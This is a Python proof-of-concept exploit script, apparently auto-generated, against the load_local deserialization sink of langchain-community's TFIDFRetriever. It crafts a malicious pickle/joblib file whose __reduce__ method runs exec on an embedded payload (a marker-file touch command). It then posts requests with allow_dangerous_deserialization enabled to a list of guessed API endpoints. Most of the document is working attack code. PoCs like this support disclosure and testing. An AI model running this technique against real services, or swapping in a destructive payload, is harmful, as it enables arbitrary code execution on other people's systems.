#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_18.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in TFIDFRetriever uses joblib.load and pickle.load
on files constructed from user-controlled folder_path and file_name parameters.
Although there is an allow_dangerous_deserialization guard, it is a boolean controlled
by the caller - if set to True, arbitrary code execution is possible via malicious
.joblib or .pkl files.

This PoC demonstrates the vulnerability by:
1. Creating a malicious .joblib file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosting it at a controlled path
3. Calling load_local with folder_path pointing to our malicious file and allow_dangerous_deserialization=True

Usage: python poc.py [--target http://localhost:8000] [--folder /tmp/exploit]
"""

import argparse
import os
import pickle
import tempfile
import requests
import sys
import time
from pathlib import Path

# Benign payload - creates a marker file to prove RCE
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
"""

def create_malicious_joblib(payload_code: str, output_path: str) -> str:
    """
    Create a malicious .joblib file that executes arbitrary code when loaded.
    
    joblib.load uses pickle under the hood, so we can craft a pickle that
    executes code during deserialization.
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (exec, (payload_code,))
    
    malicious_obj = MaliciousPayload()
    
    # Save as .joblib (which is just pickle with a different extension)
    joblib_path = output_path + ".joblib"
    with open(joblib_path, 'wb') as f:
        pickle.dump(malicious_obj, f)
    
    # Also create a dummy .pkl file (the function loads both)
    pkl_path = output_path + ".pkl"
    with open(pkl_path, 'wb') as f:
        pickle.dump({"dummy": "data"}, f)
    
    return joblib_path

def exploit(target_url: str, folder_path: str, file_name: str = "exploit"):
    """
    Attempt to exploit the load_local RCE vulnerability.
    
    The function expects:
    - folder_path: path to directory containing the files
    - file_name: base name for .joblib and .pkl files
    - allow_dangerous_deserialization: must be True
    
    We'll craft a request that triggers load_local with our malicious files.
    """
    # Create malicious files in the specified folder
    print(f"[*] Creating malicious files in {folder_path}")
    os.makedirs(folder_path, exist_ok=True)
    file_base = os.path.join(folder_path, file_name)
    create_malicious_joblib(BENIGN_PAYLOAD, file_base)
    
    # The actual exploit depends on how the application exposes load_local.
    # Since this is a library function, we need to find how it's called.
    # Common patterns:
    # 1. Direct API endpoint that calls load_local
    # 2. Web interface that accepts folder_path and file_name
    
    # For this PoC, we'll try common API patterns
    endpoints = [
        f"{target_url}/api/v1/trigger",
        f"{target_url}/api/load_retriever",
        f"{target_url}/load",
        f"{target_url}/tfidf/load",
    ]
    
    payloads = [
        {"folder_path": folder_path, "file_name": file_name, "allow_dangerous_deserialization": True},
        {"folder_path": folder_path, "file_name": file_name, "allow_dangerous_deserialization": "true"},
        {"folder_path": folder_path, "file_name": file_name, "allow_dangerous_deserialization": 1},
    ]
    
    for endpoint in endpoints:
        for payload in payloads:
            try:
                print(f"[*] Trying {endpoint} with payload: {payload}")
                response = requests.post(
                    endpoint,
                    json=payload,
                    timeout=10,
                    headers={"Content-Type": "application/json"}
                )
                print(f"[+] Response status: {response.status_code}")
                print(f"[+] Response body: {response.text[:200]}")
                
                # Check if our payload executed
                if os.path.exists("/tmp/poc_success.txt"):
                    print("[!] SUCCESS! RCE achieved - /tmp/poc_success.txt created")
                    return True
                    
            except requests.exceptions.ConnectionError:
                print(f"[-] Connection refused to {endpoint}")
            except requests.exceptions.Timeout:
                print(f"[-] Timeout connecting to {endpoint}")
            except Exception as e:
                print(f"[-] Error: {e}")
    
    # If direct API calls didn't work, try alternative approaches
    print("[*] Trying alternative exploitation methods...")
    
    # Method 2: If the application uses the library directly with user input
    # We might need to find the actual entry point
    print("[*] Checking if we can trigger via other means...")
    
    # Check if the marker file was created (maybe by another process)
    if os.path.exists("/tmp/poc_success.txt"):
        print("[!] SUCCESS! RCE achieved - /tmp/poc_success.txt created")
        return True
    
    print("[-] Exploit attempt completed. Check if /tmp/poc_success.txt exists.")
    print("[*] Note: This PoC assumes the target application exposes load_local")
    print("[*] via an API endpoint. You may need to adjust the endpoint URL.")
    return False

def main():
    parser = argparse.ArgumentParser(description="PoC for langchain-community RCE")
    parser.add_argument("--target", default="http://localhost:8000",
                        help="Target URL (default: http://localhost:8000)")
    parser.add_argument("--folder", default="/tmp/langchain_exploit",
                        help="Folder path for malicious files (default: /tmp/langchain_exploit)")
    parser.add_argument("--file-name", default="exploit",
                        help="Base file name (default: exploit)")
    
    args = parser.parse_args()
    
    print("[*] langchain-community RCE Proof-of-Concept")
    print(f"[*] Target: {args.target}")
    print(f"[*] Folder: {args.folder}")
    print(f"[*] File name: {args.file_name}")
    print()
    
    # Clean up any previous marker
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
    
    success = exploit(args.target, args.folder, args.file_name)
    
    if success:
        print("\n[!] Vulnerability confirmed! RCE is possible.")
        print("[*] Clean up: rm -rf {} /tmp/poc_success.txt".format(args.folder))
    else:
        print("\n[-] Could not confirm RCE. The target may not be vulnerable,")
        print("    or the API endpoint may differ from what we tested.")
        print("[*] Try adjusting the --target URL to match your application.")

if __name__ == "__main__":
    main()
